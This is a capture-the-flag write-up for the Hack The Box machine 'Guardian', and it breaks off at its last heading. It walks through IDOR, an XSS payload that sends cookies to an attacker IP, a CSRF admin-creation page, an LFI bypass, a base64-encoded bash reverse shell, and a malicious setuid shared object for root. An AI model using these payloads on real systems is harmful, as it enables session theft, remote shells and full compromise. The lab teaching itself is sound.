# Guardian — Hard (HTB)

## Summary

Guardian is a web-heavy Hard machine involving credential leakage, IDOR-based chat enumeration, stored XSS leading to session hijacking, CSRF abuse for admin creation, LFI-to-RCE via PHP wrappers, credential reuse for lateral movement, and a custom Apache module privilege escalation to root.

---

## Enumeration

**Open Ports**

* 22/tcp — SSH
* 80/tcp — HTTP

**Domains Discovered**

* `guardian.htb`
* `portal.guardian.htb`
* `gitea.guardian.htb`

**Initial Findings**

* Student login pattern discovered: `GU<id><year>`
* Default password identified: `GU1234`
* Valid credential from testimonials:

  * `GU0142023 : GU1234`

---

## Initial Access (Student)

**Valid Credentials**

```
GU0142023 : GU1234
```

After authenticating as a student, several endpoints became accessible under `/student/`.

### IDOR — Chat Enumeration

The chat feature uses numeric user IDs via GET parameters:

```
/student/chat.php?chat_users[0]=<id>&chat_users[1]=<id>
```

No authorization checks are performed to ensure the logged-in user belongs to the requested chat.

**Enumeration**

```bash
seq 1 20 > ids.txt

ffuf -u 'http://portal.guardian.htb/student/chat.php?chat_users[0]=FUZZ1&chat_users[1]=FUZZ2' \
  -w ids.txt:FUZZ1 -w ids.txt:FUZZ2 \
  -mode clusterbomb \
  -H 'Cookie: PHPSESSID=<student_session>' \
  -fw 2176,2768,2773,2763,2770
```

Chat logs revealed internal credentials for other services.

---

## Gitea Access & Source Review

**Leaked Credentials (from IDOR chat)**

```
jamil.enockson@guardian.htb : <password>
```

Added host entry:

```
10.129.x.x gitea.guardian.htb
```

### Sensitive Source Disclosure

From `portal.guardian.htb/config/config.php`:

```php
return [
  'db' => [
    'dsn' => 'mysql:host=localhost;dbname=guardiandb',
    'username' => 'root',
    'password' => 'Gu4rd14n_un1_1s_th3_b3st'
  ],
  'salt' => '8Sb)tM1vs1SS'
];
```

Composer dependencies revealed vulnerable libraries:

```json
"phpoffice/phpword": "^1.3"
```

This version is affected by **CVE-2025-22131**.

---

## Stored XSS → Lecturer Account Takeover

### Vulnerability

`phpoffice/phpword` fails to sanitize XLSX sheet names.

### Payload

Rename an additional sheet using TreeGrid:

```html
"><img src=x onerror=fetch('http://10.10.14.82:8000/?c='+btoa(document.cookie))>
```

### Listener

```bash
nc -lvnp 8000
```

### Result

```
PHPSESSID=8egl9srdo2cr1hq3u2ocbjdbno
```

Replaced cookie → logged in as **lecturer (sammy.treat)**.

---

## Lecturer → Admin (CSRF)

### Stored XSS (Notice Board)

Reference link is rendered unsanitized and visited by admins.

Test payload:

```
http://10.10.14.82:8000
```

Confirmed admin interaction via callback.

### CSRF Weakness

* Tokens reused globally
* Token pool shared across users

### Malicious CSRF Page

```html
<form action="http://portal.guardian.htb/admin/createuser.php" method="POST">
  <input type="hidden" name="username" value="attacker">
  <input type="hidden" name="password" value="P@ssw0rd123">
  <input type="hidden" name="user_role" value="admin">
  <input type="hidden" name="csrf_token" value="1e5bb9861bb543d1edcde166cebcfd0c">
</form>
<script>document.forms[0].submit()</script>
```

Admin user successfully created.

---

## RCE via LFI

### Vulnerable Endpoint

```
/admin/reports.php?report=<file>
```

### Filter Logic

* Blocks `..`
* Requires suffix match: `academic|system|financial.php`

### Bypass

```
php://filter/convert.base64-encode/resource=reports/academic.php
```

Decoded PHP confirmed inclusion.

### RCE Payload

Injected PHP via report variable:

```php
a=system("printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuODIvNDQ0NCAwPiYxKSY=|base64 -d|bash");
```

Reverse shell obtained as `www-data`.

---

## Credential Access

Connected to MySQL:

```bash
mysql -u root -pGu4rd14n_un1_1s_th3_b3st
```

Extracted hashes:

```sql
SELECT username,password_hash FROM users;
```

Cracked with hashcat:

```bash
hashcat -m 1410 hashes.txt rockyou.txt
```

Recovered:

* `jamil.enockson : copperhouse56`
* `admin : fakebake000`

---

## Lateral Movement

* Switched to `jamil.enockson`.
* Found sudo permission:

  ```
  (mark) NOPASSWD: /opt/scripts/utilities/utilities.py system-status
  ```
* Script already contained an unsafe function.
* Achieved shell as `mark.pargetter`.

---

## Privilege Escalation (Root)

### Mark Sudo Rights

```
(ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
```

Binary loads Apache modules via config file.

### Malicious Shared Object

```c
__attribute__((constructor)) void init() {
  setuid(0);
  system("chmod +s /bin/bash");
}
```

### Exploit

```bash
gcc -shared -fPIC evil.c -o evil.so

LoadModule evil_module /home/mark/confs/evil.so

sudo /usr/local/bin/safeapache2ctl -f exploit.conf
```

### Root Shell

```bash
bash -p
```

---

## Final Not
